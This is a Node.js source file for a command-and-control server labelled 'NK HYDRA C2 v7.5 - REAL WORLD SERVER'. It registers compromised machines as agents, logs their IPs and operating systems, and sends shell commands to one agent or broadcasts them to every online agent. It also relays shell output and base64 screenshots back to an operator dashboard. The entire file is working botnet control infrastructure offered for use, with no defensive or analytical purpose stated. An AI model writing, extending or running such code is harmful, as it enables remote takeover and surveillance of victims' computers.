// NK HYDRA C2 v7.5 - REAL WORLD SERVER
// STRICT SEPARATION OF UI vs AGENTS
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

// --- DASHBOARD UI ---
const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>NK HYDRA C2</title>
    <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;}</style>
</head>
<body>
    <h1>HYDRA C2 SERVER ACTIVE</h1>
    <p>Endpoints Ready.</p>
</body>
</html>
`;

app.get('/', (req, res) => res.send(dashboardHTML));

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 60000,
    pingInterval: 25000
});

// Store ONLY Real Agents here
let agents = [];

io.on('connection', (socket) => {
    
    socket.on('identify', (data) => {
        // UI CONNECTION HANDLER
        if (data.type === 'ui') {
            // Join UI room for updates
            socket.join('ui_room');
            // Send current list immediately so UI doesn't show 0
            socket.emit('agents_list', agents);
            return; // STOP EXECUTION HERE - DO NOT ADD TO AGENTS LIST
        }

        // AGENT CONNECTION HANDLER
        if(data.type === 'agent') {
            const existing = agents.find(a => a.id === data.id);
            if(existing) {
                existing.socketId = socket.id;
                existing.status = 'Online';
                existing.lastSeen = Date.now();
                existing.ip = data.ip || socket.handshake.address; // Update IP
            } else {
                agents.push({
                    socketId: socket.id,
                    id: data.id || socket.id, // e.g. "DESKTOP-XYZ_V7_SWARM"
                    type: 'agent',
                    os: data.os || 'Unknown',
                    ip: data.ip || socket.handshake.address,
                    status: 'Online',
                    lastSeen: Date.now()
                });
            }
            
            // Broadcast update to all UIs
            io.to('ui_room').emit('agents_list', agents);
            io.to('ui_room').emit('agent_event', { type: 'SYSTEM', agentId: data.id, payload: 'Agent Connected' });
            console.log(`[+] AGENT CONNECTED: ${data.id}`);
        }
    });
    
    socket.on('get_agents', () => {
        // Allow UI to manually poll
        socket.emit('agents_list', agents);
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if(agent) {
            agent.status = 'Offline';
            io.to('ui_room').emit('agents_list', agents);
            io.to('ui_room').emit('agent_event', { type: 'SYSTEM', agentId: agent.id, payload: 'Agent Disconnected' });
            console.log(`[-] AGENT DISCONNECTED: ${agent.id}`);
        }
    });

    socket.on('stream_log', (data) => {
        io.to('ui_room').emit('agent_event', { type: 'SHELL_OUTPUT', agentId: data.from, payload: data.output });
    });
    
    socket.on('upload_file', (data) => {
        io.to('ui_room').emit('agent_event', { 
            type: 'SCREENSHOT', 
            agentId: data.target || 'Unknown', 
            payload: data.b64content 
        });
    });

    socket.on('exec_cmd', (data) => {
        const { targetId, cmd } = data;
        console.log(`[CMD] ${cmd} -> ${targetId}`);
        
        if (targetId === 'all') {
            const onlineAgents = agents.filter(a => a.status === 'Online');
            onlineAgents.forEach(agent => {
                io.to(agent.socketId).emit('exec', { cmd });
            });
            io.to('ui_room').emit('agent_event', { type: 'SYSTEM', agentId: 'SERVER', payload: `Broadcast sent to ${onlineAgents.length} agents.` });
        } else {
            const target = agents.find(a => a.id === targetId);
            if(target && target.status === 'Online') {
                io.to(target.socketId).emit('exec', { cmd });
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`HYDRA C2 LISTENING ON PORT ${PORT}`);
});
